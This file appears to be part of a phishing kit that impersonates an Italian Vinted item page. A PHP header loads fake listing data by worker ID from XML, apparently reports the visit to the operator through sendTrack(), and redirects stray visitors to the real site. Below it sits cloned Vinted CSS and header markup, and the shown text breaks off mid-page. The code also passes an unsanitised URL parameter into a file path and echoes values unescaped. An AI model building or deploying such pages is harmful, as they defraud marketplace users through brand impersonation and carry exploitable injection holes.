
<?php
include "service.php";
include "../settings.php";
if (file_exists("data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_GET["id"] . ".xml");
sendTrack($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id);
?>
<!DOCTYPE html>
<html lang="it" class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Vinted |  Compra e vendi vestiti in una comunità alla moda</title>
<style>* {
    padding: 0;
    margin: 0;
    box-sizing: border-box;
}
._4 {
    font-size: 20px;
    font-weight: 600;
    margin-bottom: 20px;
    margin-top: 40px;
}

.block {
    margin-top: 30px;
    display: flex;
}
.adress1 {
    width: 50%;
    margin-right: 15px;
}
.adress2 {
    width: 35%;
    margin-right: 15px;
}
.nav-info {
    width: 30%;
    margin-left: 30px;
}

body {
    font-family: 'Roboto', sans-serif;
    background: #fff;
    color: #555;
    min-width: 280px;
    margin: 0 30px;
}
#top-menu {
    width: 100%; 
    height: 35px; 
    border-bottom: 1px solid #dfe3ed; 
    max-width: 1200px; 
    margin: 0 auto;
}
header {
    height: 100px;
}
#icon-star {
    font-size: 22px;
    color: #fff;
}
#icon-star:before {
    content: "";
}
header .container {
    border-bottom: 1px solid #dfe3ed;
    height: 80px;
    padding-left: 17px;
}
.container {
    padding: 0;
    max-width: 1200px;
    margin: 0 auto;
    height: 100%;
}
#header-menu-top {
    width: 734px; 
    display: flex; 
    float: right;
    margin-top: 8px;
}
.between {
    margin: 0 7px;
    font-size: 14px;
    color: #dedede;
}
#header-menu-top a {
    text-decoration: none;
    font-size: 14px;
    color: #8d98a7;
}
#header-menu-top a:hover {
    text-decoration: underline;
}
#logbutton {
    padding-left: 18px;
    text-decoration: none;
    color: #09B1BA;
    background-color: #fdf6e5;
    border: 1px solid #fdf6e5;
    float: right;
    font-size: 16px;
    font-weight: 600;
    line-height: 1.25;
    margin-top: 16px;
    margin-bottom: 12px;
    padding: 10px 15px;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    border-radius: 4px;
}
#logbutton:hover {
    border: 1px solid #09B1BA;
}

.header-logo {
    display: block;
    position: absolute;
    top: 56px;
    z-index: 10;
}

.header-logo_o {
    position: absolute;
    left: 0;
    top: 0;
    transform: translate(12px, 15px);
    content: '';
    border-radius: 50%;
    width: 10px;
    height: 10px;
    box-shadow: 0 0 0 12px #24e5db;
}

.header-logo_l {
    width: 10px;
    top: 0;
    bottom: 0;
    background: #23e5db;
    position: absolute;
    left: 37px;
}

.header-logo_x {
    width: 20px;
    height: 20px;
    overflow: hidden;
    display: block;
    position: absolute;
    left: 0;
    top: 0;
    transform: translate(51px, 10px);
}

.header-logo_x:before {
    transform: skewX(45deg) translate(-50%, 0);
    content: '';
    position: absolute;
    top: 0;
    left: 50%;
    width: 65%;
    height: 100%;
    background: #24e5db;
}

.header-logo_x:after {
    transform: skewX(-45deg) translate(-50%, 0);
    content: '';
    position: absolute;
    top: 0;
    left: 50%;
    width: 65%;
    height: 100%;
    background: #24e5db;
}
#footermain {
    display: flex;
    max-width: 1200px;
    margin: 0 auto;
}
#nav3 {
    width: 40%;
}
main {
    margin: 20px 0;
}

.section-content {
    padding: 24px;
}
.nav-info > ul > li > a {
    text-decoration: none;
    color: #717e8f;
    font-size: 14px;
    font-weight: 100;
}
.nav-info > ul {
    padding: 0;
}
.nav-info > ul > li {
    list-style: none;
    margin-bottom: 15px;
}

.item-container {
    display: flex;
    flex-direction: row;
    justify-content: space-between;
    align-items: start;
    margin-bottom: 70px;
}

.item-block {
    max-width: 68%;
    background: #fff;
}
.item-block_header {
    margin-bottom: 40px;
}

.item-block_title {
    font-size: 24px;
    line-height: 1.16;
    font-weight: 400;
}

.item-block_text {
    display: inline-block;
    vertical-align: top;
    margin-left: 20px;
    word-wrap: break-word;
    word-break: break-word;
    line-break: normal;
    hyphens: manual;
    max-width: 70%;
}

.item-block_image {
    display: inline-block;
    height: 115px;
}

.item-block_image img {
    border-radius: 5px;
    height: 115px;
    width: 110px;
    object-fit: cover;
}

.item-block_price {
    font-size: 30px;
    font-weight: 500;
    margin-top: 5px;
    color: #09B1BA;
}

.item-block_status {
    font-size: 17px;
    font-weight: 500;
    margin-top: 10px;
}

.item-block_main {
    margin-top: 36px;
}

.item-block_description {

}

.recipient-block_row {
    display: flex;
    flex-direction: row;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 30px;
}

.recipient-block_row label {
    display: block;
    margin-bottom: 5px;
}

.recipient-block_input {
    width: 100%;
    height: 38px;
    border: none;
    border-bottom: 1px #dfe3ed solid;
    outline: none;
    color: #3c4858;
    font-size: 16px;
    font-weight: 600;
}

.recipient-subblock_min {
    width: 100%;
}

.recipient-subblock_max {
    width: 100%;
}

.description-title {
    font-size: 24px;
    font-weight: 500;
    margin-bottom: 15px;
}

.description-subtitle {
    font-size: 16px;
    line-height: 24px;
}

.description-mail {
    width: 200px;
    margin-top: 25px;
}

.item-block_footer {
    border-top: 1px #dfe3ed solid;
    margin-top: 30px;
    padding-top: 20px;
}

.item-footer_text {
    font-size: 15px;
    color: #09B1BA;
}

.item-pay {
    max-width: 30%;
    width: 100%;
    background: white;
}

.item-pay_title {
    font-weight: 500;
}

.item-pay_item {
    margin-top: 5px;
    font-size: 15px;
}

.item-pay_price {
    font-size: 20px;
    margin-top: 15px;
}

.item-pay_button {
    background-color: #09B1BA;
    transition: all 0.3s ease;
    width: 100%;
    height: 45px;
    cursor: pointer;
    border: none;
    border-radius: 4px;
    font-size: 15px;
    line-height: 1.25;
    font-weight: 500;
    color: #ffffff;
    margin: 25px 0;
}

.item-pay_safery {
    font-size: 15px;
    margin-bottom: 10px;
}

.item-pay_safery img {
    width: 20px;
    height: 20px;
    vertical-align: middle;
    margin-right: 10px;
}

.item-pay_info {
    line-height: 1.4;
    font-size: 14px;
}

.item-pay_paymentMethods {
    max-width: 30px;
    width: 10%;
    margin-top: 10px;
    opacity: 0.6;
    filter: grayscale(100%);
    margin-left: 25px;
}

.section-info {
    background: #fff;
    border: 1px solid #f2f4f5;
    padding: 24px 15px;
    width: 100%;
    margin-bottom: 20px;
}

.section-info_icon {
    height: 38px;
    vertical-align: middle;
}

.section-info_text {
    display: inline-block;
    vertical-align: middle;
    margin-left: 20px;
    width: 80%;
}

.section-info_title {
    font-size: 24px;
    font-weight: 500;
}

.section-info_subtitle {
    font-size: 17px;
    font-weight: 400;
    margin-top: 10px;
}



























@media(max-width: 1100px) {
    .item-container {
        display: block;
    }

    section {
        width: 100%;
        max-width: 100% !important;
        margin-bottom: 20px;
    }
} 
@media(max-width: 800px) {
    #top-menu {
    display: none;
    }
    .header-logo {
    top: 20px;
    }
}
@media(max-width: 720px) {
    #footermain {
    display: block;
    }
    .nav-info {
    width: 100%;
    margin-bottom: 60px;
    }
    .item-block_title {
        font-size: 20px;
    }
    .inlblk  {
    display: none;
    }
}
@media(max-width: 500px) {
    .item-block_image img {
    height: 200px;
    width: 90%;
    margin-bottom: 20px;
    }
    .item-block_text {
    max-width: 90%;
    margin-left: 0;
    }
    #logbutton  {
    display: none;
    }
    #footermain {
    margin-left: 0;
    }
    .section-info_title {
        font-size: 20px;
    }

    .section-info_subtitle, .item-block_status {
        font-size: 15px;
    }

    .item-block_price {
        font-size: 26px;
    }

    .recipient-block_row {
        display: block;
    }

    .recipient-subblock_min {
        width: 100%;
        margin-bottom: 20px;
    }
} @media(max-width: 460px) {
    .section-info_icon {
        display: none;
    }

    .section-info_text {
        width: 100%;
        margin-left: 0px;
    }
    .item-block_text {
    margin-left: 0;
    }
}


/* Generator */
.generator-container {
    max-width: 500px;
    margin: 0 auto;
}

.generator-section {
    margin: 30px 0;
    width: 100%;
}

.generator-span {
    display: block;
    margin-bottom: 10px;
    font-size: .95em;
}

.generator-a {
    color: unset;
    font-weight: 600;
}

.generator-label {
    display: block;
    font-size: 1.05em;
    margin-bottom: 5px;
}

.generator-input {
    width: 100%;
    height: 38px;
    border: none;
    border-bottom: 1px #002f34 solid;
    outline: none;
    color: #002F34;
    font-size: 16px;
    background: unset;
}

.generator-button {
    background-color: #002f34;
    transition: all 0.3s ease;
    width: 100%;
    height: 45px;
    cursor: pointer;
    border: none;
    border-radius: 4px;
    font-size: 15px;
    line-height: 1.25;
    font-weight: 500;
    color: #ffffff;
}

.generator-input::placeholder {
    opacity: .7;</style>
<script></script>
<meta property="og:url" content="https://www.vinted.it/">
<meta property="og:site_name" content="Vinted">
<meta property="og:title" content="<?php echo $xml->obyava; ?>">
<meta property="og:description" content="<?php echo $xml->price; ?>">
<meta property="og:image" content="<?php echo $xml->img; ?>">
<meta property="og:type" content="website">
<meta property="og:locale" content="it_IT">
<style>
:root{--cp1:9,177,186;--cs3:240,62,83;--cg1:17,17,17;--cg2:51,51,51;--cg3:102,102,102;--cg4:153,153,153;--cg5:187,187,187;--cg6:221,221,221;--cg7:235,237,238;--cg8:245,246,247;--cg9:255,255,255}:root{--cs1:0,192,109;--cs2:247,198,0;--csl1:202,241,239;--csl2:195,244,201;--csl3:241,235,178;--csl4:255,229,229;--csm1:115,220,220;--csm2:128,228,171;--csm3:249,221,116;--csm4:255,142,142;--facebook:59,89,152;--google:66,133,244;--ct1:7,111,116;--ca100:0,70,84;--ca80:0,119,130;--ca60:9,177,186;--ca40:114,212,212;--ca20:201,240,238;--ca10:237,249,249;--em100:23,80,59;--em80:25,123,86;--em60:51,172,120;--em40:125,203,170;--em20:190,226,212;--em10:237,249,240;--co100:90,43,57;--co80:164,57,84;--co60:235,95,111;--co40:244,177,171;--co20:253,220,220;--co10:255,246,244;--sa100:141,109,72;--sa80:201,152,79;--sa60:245,180,82;--sa40:252,207,140;--sa20:255,234,203;--sa10:255,246,232;--br100:90,63,57;--br80:157,100,83;--br60:214,127,101;--br40:228,202,188;--br20:241,234,225;--br10:250,246,240;--la100:39,39,76;--la80:81,67,119;--la60:154,121,181;--la40:209,193,217;--la20:228,223,235;--la10:243,242,247}@supports (-ms-overflow-style: none){}::-webkit-input-placeholder{text-transform:none}::-moz-placeholder{text-transform:none}:-ms-input-placeholder{text-transform:none}input:-moz-placeholder{text-transform:none}html{height:100%;font-size:62.5%;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}html,button{font-family:"Maison Neue", "Helvetica Neue", "Helvetica-Neue", "Arial", sans-serif;color:RGB(var(--cg2))}body{padding:90px 0 0 0;min-width:960px;padding-top:52px;margin:0;overflow:-moz-scrollbars-vertical;overflow-x:hidden;overflow-y:scroll;min-height:100%;position:relative;font-size:1.3rem;line-height:1.25;-webkit-tap-highlight-color:transparent}@supports (position: sticky) or (position: -webkit-sticky){body{padding:0}}body:after{position:absolute;font-size:0;visibility:hidden}@media only screen and (max-width: 720px){body:after{content:'phones'}}@media only screen and (min-width: 721px) and (max-width: 959px){body:after{content:'tablet'}}@media only screen and (min-width: 960px){body:after{content:'desktop'}}body.is-wide{min-width:1280px}@media only screen and (min-width: 960px){body.is-wide{width:100% !important;max-width:100% !important;min-width:240px !important}}@media only screen and (min-width: 721px) and (max-width: 959px), only screen and (max-width: 720px){body{min-width:240px !important;max-width:100% !important;width:100% !important}}body:before{position:absolute;top:-9999px;left:-9999px;width:1px;height:1px}ul{margin:0;padding:0}li{margin:10px 0 0 20px}button::-moz-focus-inner{padding:0;border:0}@font-face{font-family:'Maison Neue';src:url("MaisonNeueWEB-Medium.woff2") format("woff2"),url("MaisonNeueWEB-Medium.woff") format("woff");font-weight:bold}@font-face{font-family:'Maison Neue';src:url("MaisonNeueWEB-Medium.woff2") format("woff2"),url("MaisonNeueWEB-Medium.woff") format("woff");font-weight:500}@font-face{font-family:'Maison Neue';src:url("MaisonNeueWEB-Book.woff2") format("woff2"),url("MaisonNeueWEB-Book.woff") format("woff");font-weight:normal}ul{margin:10px 0 0}ul{color:inherit}a{color:RGB(var(--cp1));text-decoration:none;cursor:pointer}a:hover{text-decoration:none}@media only screen and (min-width: 960px){a:hover{text-decoration:underline}}input,button{font-size:inherit;box-sizing:border-box;font-family:"Maison Neue", "Helvetica Neue", "Helvetica-Neue", "Arial", sans-serif;font-weight:normal}button{-webkit-appearance:none}button{cursor:pointer}button{font-size:inherit;display:inline-block;margin:0;padding:0;line-height:inherit;color:inherit;vertical-align:baseline;background:none;border:0;cursor:pointer;overflow:visible;-webkit-user-select:none;-moz-user-select:none}.container{position:relative;width:960px;max-width:100%;margin:0 auto;box-sizing:border-box}.container:before,.container:after{content:'';display:table}.container:after{clear:both}.is-wide .container{width:1280px;padding-right:20px;padding-left:20px}@media only screen and (min-width: 721px) and (max-width: 959px){.is-wide .container{margin:0}}@media only screen and (max-width: 720px){.is-wide .container{padding-right:8px;padding-left:8px}}@media only screen and (min-width: 721px) and (max-width: 959px), only screen and (max-width: 720px){.container{min-width:0;width:auto}}@media only screen and (min-width: 721px) and (max-width: 959px){.container{margin-left:20px;margin-right:20px}}@media only screen and (max-width: 720px){.container{padding-right:8px;padding-left:8px}}@media only screen and (min-width: 721px) and (max-width: 959px), only screen and (max-width: 720px){.site{width:100% !important}}.l-header{display:flex;flex-direction:column;position:fixed;top:0;z-index:100010;width:100%;background:rgba(var(--cg9), 1);border-bottom:1px solid rgba(var(--cg1), 0.08)}@supports (position: sticky){.l-header{position:sticky}}@supports (position: -webkit-sticky){.l-header{position:-webkit-sticky}}.l-header__main{padding-top:4px;padding-bottom:4px}@media only screen and (min-width: 960px){.l-header__main{height:52px;padding-top:0;padding-bottom:0}}.l-header__navigation{display:none;box-sizing:border-box;border-top:1px solid rgba(var(--cg1), 0.08)}@media only screen and (min-width: 960px){.l-header__navigation{display:block}}.l-header__content{display:flex;align-items:center;width:100%}@media only screen and (min-width: 960px){.l-header__toggle{display:none}}.l-header__search{display:none;width:100%}@media only screen and (min-width: 960px){.l-header__search{display:block}}.l-header__logo{height:44px}@media only screen and (min-width: 960px){.l-header__logo,.l-header__search{margin-right:48px}}.l-header__actions{display:flex;margin-left:auto;align-items:center}.l-header__search,.l-header__actions{position:relative;z-index:100030}.l-search{display:flex;position:fixed;top:52px;z-index:100005;height:52px}@supports (position: sticky){.l-search{position:sticky}}@supports (position: -webkit-sticky){.l-search{position:-webkit-sticky}}@media only screen and (min-width: 960px){.l-search{display:none}}.svg{display:inline-block;overflow:hidden;font-size:0;line-height:0;vertical-align:top}.svg svg{vertical-align:top}.svg--current svg,.svg--current path{fill:currentColor}.svg--parent-height svg{height:100%}@-moz-document url-prefix(){}.feedback-rating:not(:hover)>.feedback-rating__input:checked ~ .feedback-rating__star{color:rgba(var(--cs2), 1)}.split-screen__section-toggle:not(:checked) ~ .split-screen__logo .site-logo__mark,.split-screen__section-toggle:not(:checked) ~ .split-screen__logo .site-logo__type{fill:RGB(var(--cg9))}@media only screen and (max-width: 720px){.split-screen__section-toggle:not(:checked) ~ .split-screen__section--secondary{display:none}}@supports (position: sticky){}@supports (position: -webkit-sticky){}.sticky-footer{position:fixed;right:0;bottom:0;left:0;z-index:100005}@supports (position: sticky){}@supports (position: -webkit-sticky){}@supports (position: sticky){}@supports (position: -webkit-sticky){}.generic-toggle__on{display:none}.generic-toggle__off{display:block}.c-button{font-size:16px;line-height:22px;font-weight:500;height:44px;padding:0 14px;color:rgba(var(--cp1), 1);-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;-ms-user-select:none;-moz-user-select:none;-webkit-user-select:none;user-select:none;-moz-appearance:none;-webkit-appearance:none;display:block;box-sizing:border-box;width:100%;margin:0;text-align:center;text-decoration:none;cursor:pointer;background:none;border:1px solid currentColor;border-radius:4px}.c-button .c-button__label{height:20px}.c-button.c-button--without-text{padding-right:10px;padding-left:10px}.c-button:hover,.c-button:active,.c-button:focus{position:relative;text-decoration:none}.c-button:hover::after,.c-button:active::after,.c-button:focus::after{position:absolute;top:0;bottom:0;left:0;right:0;position:absolute;display:block;content:'';width:100%;height:100%;margin-top:-1px;margin-left:-1px;background:currentColor;border:solid 1px currentColor;border-radius:4px;opacity:0.02}.c-button:active::after{opacity:0.08}.c-button:disabled{pointer-events:none;opacity:0.24}.c-button__content{display:flex;justify-content:center;align-items:center;position:relative;z-index:1;height:100%;color:inherit;white-space:nowrap}.c-button__label{order:2;-ms-user-select:none;-moz-user-select:none;-webkit-user-select:none;user-select:none;font-weight:500;color:inherit}.c-button__icon{display:flex;justify-content:center;align-items:center;order:1}.c-button--default{font-size:16px;line-height:22px;font-weight:500;height:44px;padding:0 14px}.c-button--default .c-button__label{height:20px}.c-button--default.c-button--without-text{padding-right:10px;padding-left:10px}.c-button--small{font-size:12px;line-height:16px;font-weight:400;height:28px;padding:0 8px}.c-button--small .c-button__label{height:14px}.c-button--flat{background:none;border-color:transparent}.c-button--flat::after{border-radius:0}.c-button--filled{background:currentColor;border-color:currentColor}.c-button--filled .c-button__content{color:rgba(var(--cg9), 1)}.c-button--filled:active::after,.c-button--filled:hover::after,.c-button--filled:focus::after{background-color:rgba(var(--cg1), 1)}.c-button--truncated .c-button__label{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.c-tabs{-ms-user-select:none;-moz-user-select:none;-webkit-user-select:none;user-select:none;background:rgba(var(--cg9), 1)}.c-tabs__content{display:flex;padding:0;margin:0;list-style:none}.c-tabs__item{color:rgba(var(--cg1), 1);color-rgb:var(--cg1);position:relative;display:block;padding:12px 16px;margin:0;cursor:pointer}.c-tabs__item:hover{background:rgba(var(--cg1), 0.02)}.c-tabs__item:active{background:rgba(var(--cg1), 0.04)}.c-tabs__item-title{display:block;opacity:0.48}.c-tabs__link{display:block;padding:12px 16px;color:inherit;text-decoration:none}.c-tabs__link:hover{text-decoration:none}.c-cell{display:flex;align-items:center;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;position:relative;box-sizing:border-box;width:100%;padding:16px;background:rgba(var(--cg9), 1)}.c-cell__content{flex-grow:1;min-width:0;max-height:100%}.c-cell__body{font-size:16px;line-height:22px;color:rgba(var(--cg3), 1);font-weight:400;display:block}.c-cell--tight{padding:0px}.c-spacer{width:8px;height:8px;display:block;min-width:8px}.c-spacer--vertical{display:inline-block;height:100%}.c-icon{display:inline-block;box-sizing:border-box;font-size:0;line-height:0;text-align:center}.c-icon svg{width:100%;height:100%;max-width:100%;max-height:100%}.c-icon--regular{width:24px;height:24px;min-width:24px}.c-icon--cg4 svg{fill:RGB(var(--cg4))}.c-icon--cg5 svg{fill:RGB(var(--cg5))}.c-input .c-input__value:not(:focus)::-webkit-calendar-picker-indicator{opacity:1}.privacy-footer{min-height:100px}.privacy-footer__content{position:absolute;bottom:0;width:100%}.privacy-footer__content a,.privacy-footer__content button{font-size:1.3rem;height:auto;padding:0;margin-right:16px;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;font-weight:500;line-height:24px;color:rgba(var(--cg3), 1);white-space:nowrap;cursor:pointer;border:0}.privacy-footer__content a:hover,.privacy-footer__content button:hover{text-decoration:underline}.privacy-footer__content a:hover::after,.privacy-footer__content button:hover::after{background:none;border:0}.privacy-footer__content__links{padding:12px 0;display:flex;flex-wrap:wrap;width:100%}.u-position-relative{position:relative !important}.u-block{display:block !important}.u-flexbox{display:flex}.u-fill-height{height:100% !important}.u-align-items-center{align-items:center}@supports (position: sticky){}@supports (position: -webkit-sticky){}.u-ui-padding-left-small{padding-left:4px !important}.u-ui-padding-vertical-regular{padding-top:8px !important;padding-bottom:8px !important}.u-ui-padding-left-regular{padding-left:8px !important}.u-padding-none{padding:0 !important}@media only screen and (min-width: 721px) and (max-width: 959px), only screen and (max-width: 720px){.u-desktops-only{display:none !important}}  
  .Icon_icon__1jqT_ {
      box-sizing: border-box;
      display: inline-block;
      font-size: 0;
      line-height: 0;
      text-align: center;
    }
    
    .Icon_icon__1jqT_ svg {
      width: 100%;
      height: 100%;
      max-height: 100%;
      max-width: 100%;
      fill: rgba(var(--cg1), 1);
    }
    
    .Icon_small__22Qkb {
      width: 16px;
      height: 16px;
      min-width: 16px;
    }
    
    .Icon_cg4__2Wj-6 svg {
      fill: rgba(var(--cg4), 1);
    }
    
    .Icon_cg5__3bvZL svg {
      fill: rgba(var(--cg5), 1);
    }
    
    .Button_button__1HmfN {
      font-size: 16px;
      line-height: 22px;
      font-weight: 500;
      height: 44px;
      padding: 0 14px;
      -moz-osx-font-smoothing: grayscale;
      -webkit-font-smoothing: antialiased;
      -ms-user-select: none;
      -moz-user-select: none;
      -webkit-user-select: none;
      user-select: none;
      -moz-appearance: none;
      -webkit-appearance: none;
      background: none;
      border: 1px solid currentColor;
      border-radius: 4px;
      box-sizing: border-box;
      cursor: pointer;
      display: block;
      margin: 0;
      text-align: center;
      text-decoration: none;
      width: 100%;
    }
    
    .Button_button__1HmfN .Button_label__3jCra {
      height: 20px;
    }
    
    .Button_button__1HmfN.Button_icon-right__bMSYV .Button_content__1Pyrd {
      -webkit-flex-direction: row-reverse;
      flex-direction: row-reverse;
    }
    
    .Button_button__1HmfN.Button_icon-right__bMSYV .Button_label__3jCra + .Button_icon__3VQ6P {
      margin-left: 6px;
    }
    
    .Button_button__1HmfN:hover,
    .Button_button__1HmfN:active,
    .Button_button__1HmfN:focus {
      position: relative;
      text-decoration: none;
    }
    
    .Button_button__1HmfN:hover::after,
    .Button_button__1HmfN:active::after,
    .Button_button__1HmfN:focus::after {
      position: absolute;
      top: 0;
      bottom: 0;
      left: 0;
      right: 0;
      position: absolute;
      display: block;
      content: '';
      background: currentColor;
      border: solid 1px currentColor;
      border-radius: 4px;
      height: 100%;
      margin-left: -1px;
      margin-top: -1px;
      opacity: 0.02;
      width: 100%;
    }
    
    .Button_button__1HmfN:active::after {
      opacity: 0.08;
    }
    
    .Button_content__1Pyrd {
      color: inherit;
      height: 100%;
      position: relative;
      white-space: nowrap;
      z-index: 1;
    }
    
    .Button_label__3jCra {
      -ms-user-select: none;
      -moz-user-select: none;
      -webkit-user-select: none;
      user-select: none;
      color: inherit;
      font-weight: 500;
      -webkit-order: 2;
      order: 2;
    }
    
    .Button_content__1Pyrd,
    .Button_icon__3VQ6P {
      -webkit-align-items: center;
      align-items: center;
      display: -webkit-flex;
      display: flex;
      -webkit-justify-content: center;
      justify-content: center;
    }
    
    .Button_icon__3VQ6P {
      -webkit-order: 1;
      order: 1;
    }
    
    .Button_medium__1Kljk {
      font-size: 14px;
      line-height: 18px;
      font-weight: 400;
      height: 36px;
      padding: 0 11px;
    }
    
    .Button_medium__1Kljk .Button_label__3jCra {
      height: 16px;
    }
    
    .Button_medium__1Kljk.Button_icon-right__bMSYV .Button_content__1Pyrd {
      -webkit-flex-direction: row-reverse;
      flex-direction: row-reverse;
    }
    
    .Button_medium__1Kljk.Button_icon-right__bMSYV .Button_label__3jCra + .Button_icon__3VQ6P {
      margin-left: 4px;
    }
    
    .Button_muted__3hngQ {
      color: rgba(var(--cg4), 1);
    }
    
    .Button_flat__34jig {
      background: none;
      border-color: transparent;
    }
    
    .Button_flat__34jig::after {
      border-radius: 0;
    }
    
    .Button_truncated__3pQ92 .Button_label__3jCra {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }
    
    .Divider_divider__y6QD4 {
      display: block;
      width: 100%;
      height: 1px;
      margin: 0;
      overflow: hidden;
      font-size: 0;
      line-height: 0;
      background: rgba(var(--cg1), 0.08);
      border: 0;
    }
    
    .Divider_vertical__8QWgv {
      display: inline-block;
      width: 1px;
      min-width: 1px;
      height: auto;
      min-height: 100%;
    }
  #onetrust-pc-sdk [type="checkbox"]:not(:checked) {
    pointer-events: initial
  }
    .Toggle_toggle__2_eQF [type='checkbox']:focus-visible + .Toggle_button__1G-NM {
      outline: 5px auto Highlight;
      outline: 5px auto -webkit-focus-ring-color;
    }
    
    .Toggle_toggle__2_eQF [type='checkbox']:focus:not(:focus-visible) + .Toggle_button__1G-NM {
      outline: 0;
    }
    
    .Checkbox_checkbox__1Gqmk [type='checkbox']:focus-visible + .Checkbox_button__34dpJ::before {
      outline: 5px auto Highlight;
      outline: 5px auto -webkit-focus-ring-color;
    }
    
    .Checkbox_checkbox__1Gqmk [type='checkbox']:focus:not(:focus-visible) + .Checkbox_button__34dpJ::before {
      outline: 0;
    }
  .InputBar_prefix__2K3RM,
  .InputBar_input__PtSDV,
  .InputBar_icon__3sdwz,
  .InputBar_suffix__13eZB {
    display: -webkit-flex;
    display: flex;
  }
  .InputBar_prefix__2K3RM,
  .InputBar_suffix__13eZB {
    -webkit-align-items: flex-end;
    align-items: flex-end;
  }
  .InputBar_input__PtSDV {
    -webkit-flex: 1;
    flex: 1;
    -webkit-align-items: center;
    align-items: center;
    padding: 0 11px;
  }
  .InputBar_icon__3sdwz {
    -webkit-align-items: center;
    align-items: center;
    padding-right: 4px;
  }
  .InputBar_value__O70Da {
    font-size: 16px;
    line-height: 20px;
    color: rgba(var(--cg1), 1);
    font-weight: 400;
    -moz-osx-font-smoothing: grayscale;
    -webkit-font-smoothing: antialiased;
    display: -webkit-flex;
    display: flex;
    -webkit-flex: 1;
    flex: 1;
    width: 100%;
    font-family: inherit;
    background-color: transparent;
    border: 0;
  }
  .InputBar_value__O70Da:focus {
    outline: none;
  }
  .InputBar_value__O70Da:disabled {
    cursor: not-allowed;
    opacity: 0.48;
  }
  .InputBar_value__O70Da::-webkit-input-placeholder {
    color: rgba(var(--cg1), 1);
    opacity: 0.6;
  }
  .InputBar_value__O70Da::-moz-placeholder {
    color: rgba(var(--cg1), 1);
    opacity: 0.6;
  }
  .InputBar_value__O70Da:-ms-input-placeholder {
    color: rgba(var(--cg1), 1);
    opacity: 0.6;
  }
  .InputBar_value__O70Da::-ms-input-placeholder {
    color: rgba(var(--cg1), 1);
    opacity: 0.6;
  }
  .InputBar_value__O70Da:-ms-input-placeholder {
    color: rgba(var(--cg1), 1);
    opacity: 0.6;
  }
  .InputBar_input-bar__lzZch {
    display: -webkit-flex;
    display: flex;
    border-radius: 4px;
    background-color: rgba(var(--cg8), 1);
    padding: 0;
    min-height: 36px;
  }
  /* stylelint-disable no-descending-specificity */  
  </style>
<link type="text/css" rel="stylesheet" charset="UTF-8" href="./ord_files/translateelement.css"></head>
<body class=" default-layout is-wide">
<div class="l-header js-header">
<div class="l-header__main">
<div class="container u-flexbox u-align-items-center u-fill-height">
<div class="l-header__content">
<div class="l-header__logo">
<a class="u-block" href="https://www.vinted.pl/">
<div class="u-ui-padding-left-small">
<img src="./ord_files/logo.png" style="height: 44px">
</div>
</a>
</div>
<div class="l-header__search">
<div id="SearchBar-react-component-fb9d1a5a-e46d-4a33-8b8c-0081d90159c9">
<div>
<form method="get" action="https://www.vinted.pl/ubrania">
<div class="u-position-relative">
<div class="InputBar_input-bar__lzZch">
<div class="InputBar_prefix__2K3RM">
<div class="u-flexbox u-fill-height">
<div class="u-position-relative">
<button data-testid="search-bar-search-type" type="button" class="Button_button__1HmfN Button_flat__34jig Button_medium__1Kljk Button_muted__3hngQ Button_truncated__3pQ92 Button_icon-right__bMSYV"><span class="Button_content__1Pyrd"><span class="Button_label__3jCra"><span id="search-item"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Elementi</font></font></span></span><span class="Button_icon__3VQ6P"><div class="Icon_icon__1jqT_ Icon_small__22Qkb Icon_cg4__2Wj-6"><svg viewBox="0 0 16 16"><path d="M8 12L2 6h12z"></path></svg></div></span></span>
</button>
</div>
<div class="Divider_divider__y6QD4 Divider_vertical__8QWgv"></div>
</div>
</div>
<div class="InputBar_input__PtSDV">
<div class="InputBar_icon__3sdwz">
<div class="u-flexbox u-align-items-center">
<div class="Icon_icon__1jqT_ Icon_small__22Qkb Icon_cg5__3bvZL"> 
<svg viewBox="0 0 24 24">
<path d="M10.5 16a5.5 5.5 0 1 1 .01-11.01 5.5 5.5 0 0 1-.01 11zM22 19.87l-4.53-4.53a8.5 8.5 0 1 0-2.12 2.12L19.88 22 22 19.88z"></path>
</svg>
</div>
</div>
</div>
<input id="search_text" name="search_text" placeholder="Cerca oggetti" class="InputBar_value__O70Da" autocomplete="off">
</div>
<div class="InputBar_suffix__13eZB"></div>
</div>
</div>
</form>
</div>
</div>
</div>
<div class="l-header__actions">
<div class="u-desktops-only u-flexbox u-align-items-center">
<a class="c-button--default c-button--small c-button js-signin-button c-button--truncated" href="https://www.vinted.pl/member/signup/select_type?ref_url=%2Fkobiety%2Fubrania%2Fbluzy-i-swetry%2Fswetry-z-dzianiny%2F165434425-sweterek-cocomore"><span class="c-button__content"><span class="c-button__label"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Registrati </font><font style="vertical-align: inherit;">Accesso</font></font></span></span></a>
<div class="c-spacer--vertical c-spacer"></div>
<a class="c-button--filled c-button--default c-button--small c-button c-button--truncated" href="https://www.vinted.pl/member/signup/start?ref_url=%2Fitems%2Fnew"><span class="c-button__content"><span class="c-button__label"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vendi ora</font></font></span></span></a>
<a class="u-flexbox u-align-items-center u-ui-padding-left-regular" href="https://www.vinted.pl/help/360?access_channel=vinted_guide">
<div class="c-icon--regular c-icon--cg5 c-icon" aria-label="Vai al Centro assistenza">
<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
